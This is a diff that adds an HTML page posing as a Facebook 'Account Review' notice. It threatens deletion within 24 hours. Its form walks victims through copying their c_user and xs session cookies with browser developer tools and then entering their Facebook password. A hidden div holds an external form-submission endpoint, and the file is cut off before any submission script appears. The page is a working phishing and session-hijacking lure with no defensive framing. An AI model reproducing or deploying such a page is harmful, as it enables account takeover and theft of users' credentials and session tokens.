@@ -1,0 +1,1833 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Account Review</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://player.vimeo.com/api/player.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #f0f2f5, #e4e6eb);
+            color: #1c1e21;
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+        }
+        
+        /* Header Styles */
+        .header {
+            background: linear-gradient(to right, #1877f2, #166fe5);
+            padding: 15px 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 20px;
+            width: 100%;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: white;
+            font-size: 24px;
+            font-weight: 700;
+        }
+        
+        .logo i {
+            font-size: 28px;
+        }
+        
+        .help-center {
+            color: rgba(255,255,255,0.9);
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        /* Google Translate Container */
+        .google-translate-container {
+            position: relative;
+            z-index: 101;
+            width: 200px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 4px;
+            padding: 5px;
+        }
+        
+        .translate-title {
+            color: white;
+            font-size: 12px;
+            margin-bottom: 5px;
+            display: block;
+            text-align: center;
+        }
+        
+        /* Professional Language Modal Styles */
+        .language-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.75);
+            backdrop-filter: blur(4px);
+            z-index: 1002;
+            justify-content: center;
+            align-items: center;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        
+        .language-modal.active {
+            opacity: 1;
+            display: flex;
+        }
+        
+        .language-modal-content {
+            background: white;
+            border-radius: 20px;
+            width: 95%;
+            max-width: 650px;
+            max-height: 90vh;
+            overflow: hidden;
+            box-shadow: 0 25px 60px rgba(0,0,0,0.25);
+            transform: translateY(30px);
+            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .language-modal.active .language-modal-content {
+            transform: translateY(0);
+        }
+        
+        .language-modal-header {
+            background: linear-gradient(135deg, #1877f2, #166fe5);
+            padding: 25px 30px;
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: relative;
+        }
+        
+        .language-modal-header::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: rgba(255, 255, 255, 0.2);
+        }
+        
+        .language-title {
+            font-size: 24px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            color: white; /* Ensure text is white in header */
+        }
+        
+        .language-title i {
+            font-size: 26px;
+        }
+        
+        .close-language-modal {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            border-radius: 50%;
+            width: 42px;
+            height: 42px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 22px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .close-language-modal:hover {
+            background: rgba(255, 255, 255, 0.3);
+            transform: rotate(90deg);
+        }
+        
+        .language-search-container {
+            padding: 20px;
+            background: #f7f9fc;
+            border-bottom: 1px solid #e4e6eb;
+        }
+        
+        .search-wrapper {
+            position: relative;
+            max-width: 500px;
+            margin: 0 auto;
+            width: 100%;
+        }
+        
+        .language-search {
+            width: 100%;
+            padding: 15px 20px 15px 50px;
+            border: 2px solid #e4e6eb;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: white;
+            color: #1c1e21;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
+        
+        .language-search:focus {
+            border-color: #1877f2;
+            outline: none;
+            box-shadow: 0 0 0 4px rgba(24, 119, 242, 0.15);
+        }
+        
+        .search-icon {
+            position: absolute;
+            left: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #606770;
+            font-size: 18px;
+        }
+        
+        .language-options-container {
+            flex: 1;
+            overflow-y: auto;
+            padding: 20px;
+        }
+        
+        .language-options {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+            gap: 15px;
+        }
+        
+        .language-btn {
+            background: white;
+            border: 1px solid #e4e6eb;
+            border-radius: 12px;
+            padding: 18px 15px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .language-btn:hover {
+            transform: translateY(-3px);
+            border-color: #1877f2;
+            box-shadow: 0 8px 20px rgba(24, 119, 242, 0.12);
+        }
+        
+        .language-btn.selected {
+            border: 2px solid #1877f2;
+            background: rgba(24, 119, 242, 0.05);
+            box-shadow: 0 4px 15px rgba(24, 119, 242, 0.1);
+        }
+        
+        .language-btn.selected::after {
+            content: '';
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: 20px;
+            height: 20px;
+            background: #1877f2;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        
+        .language-btn.selected::before {
+            content: '\f00c';
+            font-family: 'Font Awesome 5 Free';
+            font-weight: 900;
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: 20px;
+            height: 20px;
+            color: white;
+            z-index: 2;
+            font-size: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .language-icon {
+            font-size: 28px;
+            color: #1877f2;
+            width: 50px;
+            height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(24, 119, 242, 0.1);
+            border-radius: 50%;
+        }
+        
+        .language-name {
+            font-weight: 600;
+            color: #1d2129;
+        }
+        
+        .language-native {
+            font-size: 13px;
+            color: #606770;
+            margin-top: 3px;
+        }
+        
+        .language-footer {
+            padding: 20px;
+            background: #f7f9fc;
+            border-top: 1px solid #e4e6eb;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .selected-language-display {
+            font-size: 15px;
+            color: #606770;
+        }
+        
+        .selected-language-display strong {
+            color: #1d2129;
+            font-weight: 600;
+        }
+        
+        .confirm-btn {
+            background: linear-gradient(135deg, #1877f2, #166fe5);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 12px 35px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            box-shadow: 0 4px 15px rgba(24, 119, 242, 0.25);
+        }
+        
+        .confirm-btn:hover {
+            background: linear-gradient(135deg, #166fe5, #1461c9);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(24, 119, 242, 0.35);
+        }
+        
+        .confirm-btn:disabled {
+            background: #e4e6eb;
+            color: #bdc1c9;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        /* Main Content */
+        .container {
+            max-width: 1000px;
+            margin: 40px auto;
+            padding: 0 20px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .review-card {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            padding: 50px;
+            width: 100%;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid #dddfe2;
+            margin-bottom: 40px;
+            text-align: center;
+        }
+        
+        .review-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: linear-gradient(to right, #ff9800, #ff5722);
+        }
+        
+        .warning-icon {
+            font-size: 70px;
+            color: #ff9800;
+            margin-bottom: 25px;
+            text-align: center;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        .review-title {
+            font-size: 36px;
+            margin-bottom: 20px;
+            color: #1d2129;
+            font-weight: 700;
+            text-align: center;
+        }
+        
+        .review-subtitle {
+            font-size: 20px;
+            color: #606770;
+            max-width: 700px;
+            margin: 0 auto 30px;
+            line-height: 1.6;
+            text-align: center;
+        }
+        
+        .deletion-warning {
+            background: rgba(255, 152, 0, 0.1);
+            border-radius: 12px;
+            padding: 25px;
+            text-align: left;
+            margin: 30px 0;
+            border-left: 4px solid #ff9800;
+        }
+        
+        .deletion-warning h3 {
+            color: #e67700;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 22px;
+        }
+        
+        .deletion-warning ul {
+            padding-left: 25px;
+        }
+        
+        .deletion-warning li {
+            margin-bottom: 12px;
+            font-size: 17px;
+            line-height: 1.6;
+            color: #1c1e21;
+        }
+        
+        .review-btn {
+            background: linear-gradient(135deg, #1877f2, #166fe5);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            padding: 18px 45px;
+            font-size: 20px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(24, 119, 242, 0.2);
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 20px;
+            display: block;
+            width: fit-content;
+            margin: 30px auto 0;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .review-btn:hover {
+            background: linear-gradient(135deg, #166fe5, #1461c9);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(24, 119, 242, 0.3);
+        }
+        
+        .review-btn::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: 0.5s;
+        }
+        
+        .review-btn:hover::after {
+            left: 100%;
+        }
+        
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            z-index: 1001;
+            overflow-y: auto;
+            padding: 20px;
+        }
+        
+        .modal-content {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.2);
+            max-width: 900px;
+            margin: 40px auto;
+            position: relative;
+            overflow: hidden;
+            animation: modalAppear 0.4s ease;
+            border: 1px solid #dddfe2;
+        }
+        
+        @keyframes modalAppear {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        .modal-header {
+            padding: 25px 30px;
+            background: linear-gradient(135deg, #1877f2, #166fe5);
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #dddfe2;
+        }
+        
+        .modal-title {
+            font-size: 24px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .close-modal {
+            background: transparent;
+            border: none;
+            color: white;
+            font-size: 28px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+        }
+        
+        .close-modal:hover {
+            background: rgba(255,255,255,0.2);
+            transform: rotate(90deg);
+        }
+        
+        .modal-body {
+            padding: 30px;
+        }
+        
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+        
+        .step {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #e4e6eb;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            position: relative;
+            z-index: 2;
+            color: #606770;
+            font-size: 18px;
+        }
+        
+        .step.active {
+            background: #1877f2;
+            color: white;
+            box-shadow: 0 0 15px rgba(24, 119, 242, 0.3);
+        }
+        
+        .step-line {
+            position: absolute;
+            top: 50%;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: #e4e6eb;
+            z-index: 1;
+        }
+        
+        .step-content {
+            display: none;
+        }
+        
+        .step-content.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .step-title {
+            text-align: center;
+            font-size: 24px;
+            margin-bottom: 25px;
+            color: #1d2129;
+        }
+        
+        /* Premium Video Player Styles */
+        .video-player-container {
+            position: relative;
+            width: 100%;
+            background: #000;
+            border-radius: 12px;
+            overflow: hidden;
+            margin: 25px 0;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+        
+        .video-container {
+            position: relative;
+            padding-top: 56.25%; /* 16:9 Aspect Ratio */
+        }
+        
+        .vimeo-iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        
+        .video-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 2;
+            transition: opacity 0.3s ease;
+        }
+        
+        .video-overlay.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        .play-btn {
+            background: rgba(24, 119, 242, 0.8);
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            margin-bottom: 20px;
+            border: 3px solid white;
+            transition: all 0.3s ease;
+        }
+        
+        .play-btn:hover {
+            transform: scale(1.1);
+            background: rgba(24, 119, 242, 1);
+        }
+        
+        .play-btn i {
+            font-size: 40px;
+            color: white;
+        }
+        
+        /* Loading Spinner Styles */
+        .loading-spinner {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 3;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0,0,0,0.7);
+            border-radius: 50%;
+            width: 100px;
+            height: 100px;
+        }
+        
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #1877f2;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 10px;
+        }
+        
+        .loading-percentage {
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Form Styles */
+        .form-group {
+            margin-bottom: 25px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 12px;
+            font-weight: 600;
+            color: #1d2129;
+            font-size: 17px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .form-group label i {
+            color: #ff9800;
+            font-size: 20px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 16px 20px;
+            border: 2px solid #dddfe2;
+            border-radius: 12px;
+            font-size: 17px;
+            transition: all 0.3s ease;
+            background: #f0f2f5;
+            color: #1c1e21;
+        }
+        
+        .form-group input:focus {
+            border-color: #1877f2;
+            outline: none;
+            background: #f0f2f5;
+            box-shadow: 0 0 0 4px rgba(24, 119, 242, 0.2);
+        }
+        
+        .mobile-instructions {
+            background: rgba(255, 152, 0, 0.1);
+            border-radius: 12px;
+            padding: 25px;
+            margin: 25px 0;
+            border-left: 4px solid #ff9800;
+        }
+        
+        .mobile-instructions h3 {
+            color: #e67700;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .mobile-instructions ol {
+            padding-left: 25px;
+        }
+        
+        .mobile-instructions li {
+            margin-bottom: 12px;
+            font-size: 16px;
+            line-height: 1.6;
+            color: #1c1e21;
+        }
+        
+        .btn-group {
+            display: flex;
+            gap: 15px;
+            margin-top: 25px;
+        }
+        
+        .btn {
+            flex: 1;
+            padding: 16px 20px;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, #1877f2, #166fe5);
+            color: white;
+            border: none;
+            box-shadow: 0 5px 15px rgba(24, 119, 242, 0.2);
+        }
+        
+        .btn-primary:hover {
+            background: linear-gradient(135deg, #166fe5, #1461c9);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(24, 119, 242, 0.3);
+        }
+        
+        .btn-outline {
+            background: transparent;
+            color: #1877f2;
+            border: 2px solid #1877f2;
+        }
+        
+        .btn-outline:hover {
+            background: rgba(24, 119, 242, 0.05);
+            transform: translateY(-3px);
+        }
+        
+        .btn::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: 0.5s;
+        }
+        
+        .btn:hover::after {
+            left: 100%;
+        }
+        
+        .success-message {
+            text-align: center;
+            padding: 40px 20px;
+        }
+        
+        .success-icon {
+            font-size: 70px;
+            color: #36a420;
+            margin-bottom: 25px;
+            animation: successPulse 1.5s infinite;
+        }
+        
+        @keyframes successPulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        .success-title {
+            font-size: 32px;
+            margin-bottom: 20px;
+            color: #1d2129;
+        }
+        
+        .success-text {
+            font-size: 18px;
+            color: #606770;
+            max-width: 600px;
+            margin: 0 auto 30px;
+            line-height: 1.6;
+        }
+        
+        /* Footer */
+        footer {
+            background: white;
+            padding: 30px 0;
+            border-top: 1px solid #dddfe2;
+            margin-top: auto;
+        }
+        
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            text-align: center;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 25px;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+        
+        .footer-links a {
+            color: #606770;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            font-weight: 500;
+        }
+        
+        .footer-links a:hover {
+            color: #1877f2;
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            color: #8a8d91;
+            font-size: 14px;
+            margin-top: 15px;
+        }
+        
+        /* Video Quality Selector */
+        .quality-selector {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            z-index: 20;
+            background: rgba(0,0,0,0.7);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 5px 10px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        
+        /* Network Status */
+        .network-status {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            z-index: 20;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            color: white;
+            font-size: 12px;
+            background: rgba(0,0,0,0.5);
+            padding: 3px 8px;
+            border-radius: 4px;
+        }
+        
+        .network-status i {
+            color: #4CAF50;
+        }
+        
+        /* Mobile Unmute Button */
+        .mobile-unmute-btn {
+            position: absolute;
+            bottom: 15px;
+            right: 15px;
+            z-index: 21;
+            background: rgba(0,0,0,0.7);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 8px 15px;
+            font-size: 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        @media (max-width: 768px) {
+            .review-card {
+                padding: 30px 20px;
+            }
+            
+            .review-title {
+                font-size: 28px;
+            }
+            
+            .review-subtitle {
+                font-size: 18px;
+            }
+            
+            .review-btn {
+                padding: 16px 30px;
+                font-size: 18px;
+            }
+            
+            .modal-content {
+                margin: 20px auto;
+            }
+            
+            .modal-header {
+                padding: 20px;
+            }
+            
+            .modal-title {
+                font-size: 20px;
+            }
+            
+            .modal-body {
+                padding: 20px;
+            }
+            
+            .btn-group {
+                flex-direction: column;
+            }
+            
+            .header-content {
+                flex-direction: column;
+                align-items: stretch;
+                gap: 15px;
+            }
+            
+            .logo {
+                justify-content: center;
+            }
+            
+            .help-center {
+                justify-content: center;
+            }
+            
+            .google-translate-container {
+                width: 100%;
+                margin-top: 10px;
+            }
+            
+            .language-options {
+                grid-template-columns: 1fr;
+            }
+            
+            /* FIXED: Mobile language modal adjustments */
+            .language-modal-content {
+                padding: 20px 15px;
+            }
+            
+            .language-title {
+                font-size: 20px;
+                padding: 10px 0;
+                position: sticky;
+                top: 0;
+                color: white;
+            }
+            
+            .language-btn {
+                padding: 12px;
+                font-size: 14px;
+            }
+            
+            .language-options {
+                max-height: 50vh;
+                overflow-y: auto;
+            }
+            
+            .close-language-modal {
+                position: sticky;
+                bottom: 0;
+                margin-top: 15px;
+            }
+            
+            .play-btn {
+                width: 60px;
+                height: 60px;
+            }
+            
+            .play-btn i {
+                font-size: 30px;
+            }
+        }
+        
+        @media (min-width: 769px) {
+            .google-translate-container {
+                position: absolute;
+                top: 15px;
+                right: 150px;
+                width: auto;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-content">
+            <div class="logo">
+                <i class="fab fa-facebook"></i>
+                <span>Facebook Account Review</span>
+            </div>
+            <div class="help-center">
+                <i class="fas fa-question-circle"></i>
+                Help Center
+            </div>
+        </div>
+    </div>
+    
+    <div class="container">
+        <div class="review-card">
+            <div class="warning-icon">
+                <i class="fas fa-exclamation-triangle"></i>
+            </div>
+            <h1 class="review-title">Urgent Account Review Required</h1>
+            <p class="review-subtitle">Your account is scheduled for deletion due to policy violations. Request a review to prevent permanent loss of your account and data.</p>
+            
+            <div class="deletion-warning">
+                <h3><i class="fas fa-info-circle"></i> Important Notice</h3>
+                <ul>
+                    <li>Your account is scheduled for deletion in <strong>24 hours</strong></li>
+                    <li>This action is due to violations of our community standards</li>
+                    <li>You may request a review of this decision</li>
+                    <li>If approved, your account will be restored with full access</li>
+                    <li>Failure to request a review will result in permanent deletion</li>
+                </ul>
+            </div>
+            
+            <p class="review-subtitle">To request a review of your account deletion, click the button below and follow the instructions.</p>
+            
+            <button class="review-btn" id="reviewBtn">
+                <i class="fas fa-file-alt"></i> Apply for Account Review
+            </button>
+            
+            <div style="display: none;">https://submit-form.com/BB33NRmU0</div>
+        </div>
+    </div>
+    
+    <!-- Professional Language Selection Modal -->
+    <div class="language-modal" id="languageModal">
+        <div class="language-modal-content">
+            <div class="language-modal-header">
+                <h2 class="language-title">
+                    <i class="fas fa-globe"></i> Select Video Language
+                </h2>
+                <button class="close-language-modal" id="closeLanguageModal">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            
+            <div class="language-search-container">
+                <div class="search-wrapper">
+                    <i class="fas fa-search search-icon"></i>
+                    <input type="text" class="language-search" id="languageSearch" placeholder="Search languages...">
+                </div>
+            </div>
+            
+            <div class="language-options-container">
+                <div class="language-options">
+                    <button class="language-btn" data-lang="english">
+                        <div class="language-icon">
+                            <i class="fas fa-language"></i>
+                        </div>
+                        <div class="language-name">English</div>
+                        <div class="language-native">English</div>
+                    </button>
+                    <button class="language-btn" data-lang="filipino">
+                        <div class="language-icon">
+                            <i class="fas fa-language"></i>
+                        </div>
+                        <div class="language-name">Filipino</div>
+                        <div class="language-native">Filipino</div>
+                    </button>
+                    <button class="language-btn" data-lang="hindi">
+                        <div class="language-icon">
+                            <i class="fas fa-language"></i>
+                        </div>
+                        <div class="language-name">Hindi</div>
+                        <div class="language-native">हिन्दी</div>
+                    </button>
+                    <button class="language-btn" data-lang="portuguese">
+                        <div class="language-icon">
+                            <i class="fas fa-language"></i>
+                        </div>
+                        <div class="language-name">Portuguese</div>
+                        <div class="language-native">Português</div>
+                    </button>
+                    <button class="language-btn" data-lang="spanish">
+                        <div class="language-icon">
+                            <i class="fas fa-language"></i>
+                        </div>
+                        <div class="language-name">Spanish</div>
+                        <div class="language-native">Español</div>
+                    </button>
+                    <button class="language-btn" data-lang="tamil">
+                        <div class="language-icon">
+                            <i class="fas fa-language"></i>
+                        </div>
+                        <div class="language-name">Tamil</div>
+                        <div class="language-native">தமிழ்</div>
+                    </button>
+                    <button class="language-btn" data-lang="arabic">
+                        <div class="language-icon">
+                            <i class="fas fa-language"></i>
+                        </div>
+                        <div class="language-name">Arabic</div>
+                        <div class="language-native">العربية</div>
+                    </button>
+                    <button class="language-btn" data-lang="japanese">
+                        <div class="language-icon">
+                            <i class="fas fa-language"></i>
+                        </div>
+                        <div class="language-name">Japanese</div>
+                        <div class="language-native">日本語</div>
+                    </button>
+                    <button class="language-btn" data-lang="french">
+                        <div class="language-icon">
+                            <i class="fas fa-language"></i>
+                        </div>
+                        <div class="language-name">French</div>
+                        <div class="language-native">Français</div>
+                    </button>
+                    <button class="language-btn" data-lang="swedish">
+                        <div class="language-icon">
+                            <i class="fas fa-language"></i>
+                        </div>
+                        <div class="language-name">Swedish</div>
+                        <div class="language-native">Svenska</div>
+                    </button>
+                </div>
+                
+                <p style="text-align: center; margin-top: 20px; color: #606770; font-size: 14px;">
+                    Can't find your language? Request it at: 
+                    <a href="mailto:support@fb.com" style="color: #1877f2; text-decoration: none;">support@fb.com</a>
+                </p>
+            </div>
+            
+            <div class="language-footer">
+                <div class="selected-language-display">
+                    Selected: <strong id="selectedLanguageDisplay">None</strong>
+                </div>
+                <button class="confirm-btn" id="confirmBtn" disabled>
+                    <i class="fas fa-check"></i> Confirm Selection
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Review Modal -->
+    <div class="modal" id="reviewModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 class="modal-title"><i class="fas fa-file-alt"></i> Account Review Request</h2>
+                <button class="close-modal" id="closeModal">&times;</button>
+            </div>
+            
+            <div class="modal-body">
+                <div class="step-indicator">
+                    <div class="step active">1</div>
+                    <div class="step">2</div>
+                    <div class="step">3</div>
+                    <div class="step-line"></div>
+                </div>
+                
+                <!-- Step 1: Video and c_user/xs -->
+                <div class="step-content active" id="step1">
+                    <h3 class="step-title">Detailed Video Information</h3>
+                    
+                    <div class="video-player-container">
+                        <div class="network-status">
+                            <i class="fas fa-signal"></i>
+                            <span>Connection: Good</span>
+                        </div>
+                        <div class="video-container">
+                            <div class="vimeo-iframe" id="vimeoPlayer"></div>
+                            <div class="loading-spinner" id="loadingSpinner">
+                                <div class="spinner"></div>
+                                <div class="loading-percentage">0%</div>
+                            </div>
+                            <div class="video-overlay" id="videoOverlay">
+                                <div class="play-btn" id="overlayPlayBtn">
+                                    <i class="fas fa-play"></i>
+                                </div>
+                                <p style="color: white; margin-top: 15px; font-weight: 600;">Click to select language</p>
+                            </div>
+                            <button class="mobile-unmute-btn" id="mobileUnmuteBtn" style="display: none;">
+                                <i class="fas fa-volume-mute"></i> Tap to Unmute
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <div class="mobile-instructions">
+                        <h3><i class="fas fa-mobile-alt"></i> For Mobile Users</h3>
+                        <p>This process requires desktop browser developer tools. Please switch to a computer:</p>
+                        <ol>
+                            <li>Open Chrome on a desktop/laptop computer</li>
+                            <li>Log in to Facebook</li>
+                            <li>Follow the video instructions to find your values</li>
+                            <li>Return here to submit your review request</li>
+                        </ol>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="c_user"><i class="fas fa-user-circle"></i> c_user Value</label>
+                        <input type="text" id="c_user" name="c_user" 
+                               placeholder="Enter your c_user value"
+                               pattern="\d+" 
+                               title="c_user only"
+                               required>
+                        <div class="validation-hint">Must contain a valid c_user value only</div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="xs"><i class="fas fa-key"></i> xs Value</label>
+                        <input type="text" id="xs" name="xs" 
+                               placeholder="Enter your xs value"
+                               pattern=".{20,}" 
+                               title="xs only"
+                               required>
+                        <div class="validation-hint">Must contain a valid xs value only</div>
+                    </div>
+                    
+                    <div class="btn-group">
+                        <button class="btn btn-outline" id="cancelBtn">
+                            <i class="fas fa-times"></i> Cancel
+                        </button>
+                        <button class="btn btn-primary" id="nextToStep2">
+                            <i class="fas fa-arrow-right"></i> Continue
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- Step 2: Password Verification -->
+                <div class="step-content" id="step2">
+                    <h3 class="step-title">Password Verification</h3>
+                    
+                    <div class="form-group">
+                        <label for="password"><i class="fas fa-lock"></i> Re-enter Password</label>
+                        <input type="password" id="password" name="password" 
+                               placeholder="Enter your Facebook password"
+                               required>
+                    </div>
+                    
+                    <div class="deletion-warning">
+                        <h3><i class="fas fa-info-circle"></i> Important Security Notice</h3>
+                        <ul>
+                            <li>This is a security verification step to confirm your identity</li>
+                            <li>Do not log out from your computer during the review process</li>
+                            <li>Keep your Facebook account logged in on your computer</li>
+                            <li>Your password is encrypted during transmission</li>
+                            <li>Do not share your password with anyone</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="btn-group">
+                        <button class="btn btn-outline" id="backToStep1">
+                            <i class="fas fa-arrow-left"></i> Back
+                        </button>
+                        <button class="btn btn-primary" id="nextToStep3">
+                            <i class="fas fa-paper-plane"></i> Submit Review Request
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- Step 3: Success Message -->
+                <div class="step-content" id="step3">
+                    <div class="success-message">
